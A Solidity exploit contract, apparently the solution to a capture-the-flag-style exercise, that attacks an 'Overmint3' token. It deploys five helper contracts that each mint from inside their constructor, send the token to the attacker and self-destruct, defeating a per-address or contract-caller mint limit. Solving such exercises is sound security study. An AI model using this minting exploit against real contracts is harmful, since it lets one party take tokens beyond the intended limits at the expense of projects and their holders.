// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

import {Overmint3} from "./Overmint3.sol";

contract Overmint3Attacker {
    constructor(address target) {
        for (uint256 i; i < 5; i++) {
            new Overmint3Horse(target, msg.sender);
        }
    }
}

contract Overmint3Horse {
    constructor(address _target, address owner) {
        Overmint3 target = Overmint3(_target);
        target.mint();
        target.transferFrom(address(this), owner, target.totalSupply());
        selfdestruct(payable(owner));
    }
}
